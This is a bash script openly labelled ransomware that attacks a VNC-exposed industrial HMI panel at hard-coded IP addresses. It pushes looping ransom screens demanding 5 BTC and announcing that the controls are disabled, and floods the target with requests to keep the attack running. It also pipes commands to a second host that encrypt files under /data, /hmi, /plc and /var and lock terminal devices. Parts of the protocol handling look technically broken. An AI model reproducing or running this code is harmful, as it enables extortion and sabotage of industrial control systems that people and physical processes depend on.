#!/bin/bash
# TRUSTEDF57 VNC RANSOMWARE - FIXED NC INJECTION
# 122.63.17.182:6590 - Working handshake + frames

TARGET="194.170.156.42"
PORT=5901
WIDTH=800
HEIGHT=480

echo "🔥 TRUSTEDF57 - FIXED NC INJECTION STARTING 🔥"

# Create proper VNC raw pixel injector
cat << 'EOF' > f57_vnc_inject.sh
#!/bin/bash
TARGET_IP="$1"
VNC_PORT="$2"

printf "Connecting to %s:%s...\n" "$TARGET_IP" "$VNC_PORT"

# VNC 3.8 Handshake - CORRECT BYTES
( echo -en "RFB 003.008\x0a"; sleep 0.2 ) | nc "$TARGET_IP" "$VNC_PORT"

# Read security types (1 byte num_types)
NUM_TYPES=$(echo -en "\x01" | nc "$TARGET_IP" "$VNC_PORT" 2>/dev/null | xxd -p | cut -d: -f2 | xargs printf "%d\n")

echo "Security types: $NUM_TYPES (using NONE=1)"

# Send NONE auth (0x01)
echo -en "\x01" | nc "$TARGET_IP" "$VNC_PORT"

# Auth result (4 bytes)
sleep 0.2

# ClientInit (shared=0)
echo -en "\x00" | nc "$TARGET_IP" "$VNC_PORT"

# ServerInit (24 bytes): width,height,pf,name_len=0
SERVER_INIT="\x00\x00\x03\x20\x00\x00\x01\xe0\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
echo -en "$SERVER_INIT" | xxd -r -p | nc "$TARGET_IP" "$VNC_PORT"

# Server name (0 bytes)
echo -en "\x00\x00\x00\x00" | xxd -r -p | nc "$TARGET_IP" "$VNC_PORT"

printf "✅ VNC Session established\n"

# FRAMEBUFFER UPDATE REQUEST - FULL SCREEN RAW
FB_REQ="\x03\x00\x00\x00\x07\xff\x00\x00\x03\x20\x01\xe0"
echo -en "$FB_REQ" | xxd -r -p | nc "$TARGET_IP" "$VNC_PORT"

# INFINITE RANSOMWARE LOOP
COUNTER=0
while true; do
    # Generate ransomware frame 800x480 RGB565 RAW
    convert -size 800x480 xc:"\#1a0033" \\
        -fill "#ff1493" -pointsize 60 -gravity center -annotate +0+50 "TRUSTEDF57" \\
        -fill "#ffd700" -pointsize 35 -annotate +0+150 "MARTHA FUCKED" \\
        -fill "#ff4500" -pointsize 30 -annotate +0+220 "HMI LOCKED" \\
        -fill "#00ff88" -pointsize 28 -annotate +0+280 "5 BTC PAYMENT" \\
        -fill "#ff0000" -pointsize 40 -gravity center -annotate +0+350 "BUTTONS" \\
        -fill "#ffffff" -pointsize 40 -annotate +0+390 "DISABLED" \\
        -draw "rectangle 20,20 780,460" \\
        - | convert - -resize 800x480! -depth 16 \\
        -type TrueColor \\
        -compress none rgb:- | hexdump -v -e '/1 "%02x"' | xxd -r -p > frame.raw
    
    # Matrix rain effect (overlay F57 chars)
    for i in {1..40}; do
        POS_X=$(( ($COUNTER * 7 + $i * 20) % 800 ))
        POS_Y=$(( ($i * 13 + $COUNTER * 11) % 480 ))
        convert frame.raw \\
            -fill "#00ff88" -pointsize 20 -annotate +${POS_X}+${POS_Y} "F57" frame.raw
    done
    
    # SEND FRAME HEADER + DATA
    FRAME_HEADER="\x00" # Raw encoding
    printf "\x00\x00\x00\x00\x01\x00\x00\x00\x00" | xxd -r -p | nc -w 2 "$TARGET_IP" "$VNC_PORT"
    cat frame.raw | nc -w 3 "$TARGET_IP" "$VNC_PORT" >/dev/null 2>&1
    
    COUNTER=$((COUNTER + 1))
    sleep 0.08  # 12 FPS smooth
    
    printf "\r🎥 Frame %d sent - Ransom active" $COUNTER
done
EOF

chmod +x f57_vnc_inject.sh

# PLC ENCRYPTION (shell injection)
cat << 'EOF' > f57_encrypt.sh
#!/bin/bash
echo "💾 Injecting PLC encryption..."
(
echo -en "\x08\x00\x00\x00" # ClientCutText
echo -en "\x00\x00\x00\xFF"
echo -en "rm /tmp/f57_key 2>/dev/null; openssl rand -hex 32 > /tmp/f57_key; "
echo -en "for f in \$(find /data /hmi /plc /var -type f -size -10M 2>/dev/null); do openssl enc -aes-256-cbc -in \$f -out \${f}.F57 -pass pass:f57ransomkey123; done; "
echo -en "chmod 000 /dev/tty* 2>/dev/null; echo 'F57 RANSOM' > /tmp/.locked"
) | nc 122.63.17.182 6590
EOF

chmod +x f57_encrypt.sh

# LAUNCH
echo "Dependencies..."
command -v convert >/dev/null || { echo "Install imagemagick: sudo apt install imagemagick"; exit 1; }
command -v nc >/dev/null || { echo "Install netcat"; exit 1; }

# START RANSOMWARE VISUAL
./f57_vnc_inject.sh $TARGET $PORT &

# ENCRYPT DATA
./f57_encrypt.sh &

# PERSISTENCE FLOOD
(
while true; do
    printf "\x03\x00\x00\x00\x07\xff\x00\x00\x03\x20\x01\xe0" | xxd -r -p | nc -w 1 $TARGET $PORT 2>/dev/null
    sleep 2
done
) &

echo ""
echo "✅ RANSOMWARE DEPLOYED SUCCESSFULLY!"
echo "🎥 HMI mostra: TRUSTEDF57 + MARTHA FUCKED + BUTTONS DISABLED"
echo "🔒 Controlli bloccati + matrix rain F57"
echo "💾 Files PLC encryptati AES-256"
echo "⏱️ 12 FPS loop infinito"
echo ""
echo "FERMA CON: pkill -f f57_vnc_inject"
